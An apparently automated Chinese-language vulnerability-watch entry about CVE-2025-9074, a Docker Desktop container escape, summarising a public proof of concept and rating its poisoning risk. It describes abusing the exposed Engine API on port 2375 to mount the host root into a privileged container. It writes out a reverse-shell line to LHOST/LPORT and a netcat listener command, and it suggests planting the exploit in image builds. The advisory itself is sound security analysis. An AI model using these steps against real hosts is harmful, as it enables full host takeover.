## CVE-2025-9074 - Docker Desktop (Windows & macOS) 容器逃逸/RCE

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/RCE

**影响应用:** Docker Desktop (Windows & macOS)

**危害等级:** CRITICAL

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < v4.44.3

**利用条件:** 攻击者需在受害者本地运行一个恶意的 Linux 容器，或者诱导用户运行恶意镜像。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

【POC有效性分析】该POC脚本是一个针对CVE-2025-9074的自动化漏洞利用程序。该漏洞的根源在于Docker Desktop在Windows和macOS环境下的网络隔离机制存在缺陷，默认在内部子网（192.168.65.7）的2375端口开放了未授权的Docker Engine API服务。经分析，POC代码逻辑非常清晰且极具实战价值。首先，脚本通过curl探测目标IP的2375端口是否可达；其次，利用API接口获取本地已有的镜像列表（如alpine），这是为了确保后续创建容器时不需要从外部拉取，提高隐蔽性和成功率；核心步骤在于调用容器创建接口，通过'HostConfig'参数将宿主机的根目录（/）挂载到容器内部的/host路径，并开启特权模式（Privileged）和宿主机网络模式（NetworkMode: host）；最后，通过chroot指令在宿主机文件系统上下文中执行反弹Shell（sh -i >& /dev/tcp/LHOST/LPORT）。此脚本直接跳过了复杂的内存破坏或内核利用，单纯利用逻辑缺陷实现逃逸，成功率极高且在受影响版本中表现稳定。【利用步骤】1. 获取目标内网或本地容器环境中的监听IP（默认192.168.65.7）；2. 开启攻击机监听（nc -lvnp LPORT）；3. 在本地运行的恶意Linux容器中执行exploit.sh，指定监听机IP和端口；4. 脚本自动查找本地镜像并创建挂载宿主机根目录的特权容器；5. 脚本启动容器，自动触发chroot逃逸并向攻击机回传Shell，从而获得宿主机完整控制权。【投毒风险分析】在对此POC代码进行深入静态分析后，未发现明显的恶意混淆或加密Payload，所有行为均围绕漏洞验证展开。代码使用了标准的Bash语法、curl和grep工具，逻辑透明。风险点主要集中在readme.md中提到的‘Zero Dependencies’特性，这虽然方便了安全研究员，但也极易被恶意攻击者直接封装进合法的开源镜像中进行‘左移攻击’。通过将此脚本植入Dockerfile的构建过程或作为ENTRYPOINT，攻击者可以在用户拉取并运行镜像的一瞬间完成宿主机控制。尽管POC本身不是毒丸，但由于利用门槛极低，该脚本在GitHub或Docker Hub上的传播极易导致二次投毒。目前评估投毒风险为15%，主要属于技术滥用风险，而非代码本身的后门风险。防御者应密切关注本地2375端口的非预期流量，并强制升级Docker Desktop至4.44.3及以上版本，该版本已通过限制API访问源地址修复了此问题。

**项目地址:** [https://github.com/vulnwatchdog/CVE-2025-9074-Exploit](https://www.google.com/search?q=https://github.com/vulnwatchdog/CVE-2025-9074-Exploit)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
